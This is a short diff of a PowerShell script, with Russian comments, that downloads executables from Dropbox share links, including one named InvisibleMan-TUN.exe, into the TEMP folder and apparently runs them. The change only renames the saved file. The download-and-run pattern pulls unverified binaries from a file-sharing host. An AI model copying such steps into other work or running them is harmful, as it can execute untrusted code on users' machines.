@@ -8,7 +8,7 @@ Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/tes
 
 # Скачиваем второе приложение (замени URL на нужный)
 Write-Host "Please whait.." -ForegroundColor Green
-Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/1q3dximiu93lv6q2ivoms/InvisibleMan-TUN.exe?rlkey=y6ko79k3hvsq4ncolk5itu48p&st=xx2dgg32&dl=1' -OutFile "$env:TEMP\test2.exe"
+Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/1q3dximiu93lv6q2ivoms/InvisibleMan-TUN.exe?rlkey=y6ko79k3hvsq4ncolk5itu48p&st=xx2dgg32&dl=1' -OutFile "$env:TEMP\InvisibleMan-TUN.exe"
 
 # Запускаем первое приложение
 Write-Host "Please whait..." -ForegroundColor Yellow
